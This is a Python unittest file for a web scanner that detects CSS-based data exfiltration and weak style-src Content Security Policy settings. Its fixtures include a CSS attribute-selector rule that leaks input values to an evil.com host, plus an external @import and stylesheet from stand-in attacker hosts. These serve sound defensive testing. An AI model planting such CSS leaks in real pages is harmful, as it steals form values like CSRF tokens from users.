"""Tests for CSSExfiltrationScanner."""
import unittest
from unittest.mock import MagicMock, patch
from tblue.scanner.css_exfiltration import CSSExfiltrationScanner

URL = "https://example.com"


def _mock_headers(d):
    m = MagicMock()
    m.items.return_value = list(d.items())
    return m


class TestCSSExfiltration(unittest.TestCase):
    def _make(self):
        s = CSSExfiltrationScanner.__new__(CSSExfiltrationScanner)
        s.http = MagicMock()
        return s

    def _resp(self, body="", headers=None):
        r = MagicMock()
        r.status_code = 200
        r.text = body
        r.headers = _mock_headers(headers or {})
        return r

    # ── Attribute selector + URL in style block ───────────────────────────────

    def test_attr_selector_url_fails(self):
        body = (
            '<html><head>'
            '<style>input[value^="a"]{background:url("https://evil.com/leak?c=a")}</style>'
            '</head><body></body></html>'
        )
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body=body)
            results = s.scan(URL)
        fails = [r for r in results if r["status"] == "FAIL"]
        self.assertTrue(any("attribute" in r["type"].lower() or "selector" in r["type"].lower() or "exfiltration" in r["type"].lower() for r in fails))

    # ── @import external URL in style ─────────────────────────────────────────

    def test_css_import_external_warns(self):
        body = (
            '<html><head>'
            '<style>@import url("https://evil.com/steal.css");</style>'
            '</head><body></body></html>'
        )
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body=body)
            results = s.scan(URL)
        warns = [r for r in results if r["status"] in ("WARN", "FAIL")]
        self.assertTrue(any("import" in r["type"].lower() for r in warns))

    # ── No CSP + CSRF token ───────────────────────────────────────────────────

    def test_no_csp_with_csrf_warns(self):
        body = (
            '<html><body>'
            '<input type="hidden" name="csrf" value="abc123">'
            '</body></html>'
        )
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body=body)
            results = s.scan(URL)
        warns = [r for r in results if r["status"] in ("WARN", "FAIL")]
        self.assertTrue(any("csrf" in r["type"].lower() or "style-src" in r["type"].lower() or "csp" in r["type"].lower() for r in warns))

    # ── unsafe-inline style-src + CSRF ───────────────────────────────────────

    def test_unsafe_inline_style_with_csrf_warns(self):
        body = '<html><body><input type="hidden" name="csrf" value="abc123"></body></html>'
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(
                body=body,
                headers={"Content-Security-Policy": "style-src 'unsafe-inline' 'self'"}
            )
            results = s.scan(URL)
        warns = [r for r in results if r["status"] in ("WARN", "FAIL")]
        self.assertTrue(any("unsafe" in r["type"].lower() or "inline" in r["type"].lower() for r in warns))

    # ── style-src wildcard warns ──────────────────────────────────────────────

    def test_style_src_wildcard_warns(self):
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(
                body="<html><body></body></html>",
                headers={"Content-Security-Policy": "style-src *"}
            )
            results = s.scan(URL)
        warns = [r for r in results if r["status"] in ("WARN", "FAIL")]
        self.assertTrue(any("wildcard" in r["type"].lower() or "style" in r["type"].lower() for r in warns))

    # ── External stylesheet without SRI ──────────────────────────────────────

    def test_external_stylesheet_without_sri_warns(self):
        body = '<html><head><link rel="stylesheet" href="https://cdn.attacker.com/style.css"></head></html>'
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(body=body)
            results = s.scan(URL)
        warns = [r for r in results if r["status"] in ("WARN", "FAIL")]
        self.assertTrue(any("sri" in r["type"].lower() or "external" in r["type"].lower() or "stylesheet" in r["type"].lower() for r in warns))

    # ── Clean page passes ─────────────────────────────────────────────────────

    def test_clean_page_passes(self):
        body = '<html><head><link rel="stylesheet" href="/styles.css"></head><body></body></html>'
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = self._resp(
                body=body,
                headers={"Content-Security-Policy": "style-src 'self' 'nonce-abc123'"}
            )
            results = s.scan(URL)
        self.assertTrue(any(r["status"] == "PASS" for r in results))
        self.assertFalse(any(r["status"] == "FAIL" for r in results))

    # ── No response ───────────────────────────────────────────────────────────

    def test_no_response_passes(self):
        s = self._make()
        with patch.object(s, "http") as m:
            m.get.return_value = None
            results = s.scan(URL)
        self.assertTrue(any(r["status"] == "PASS" for r in results))
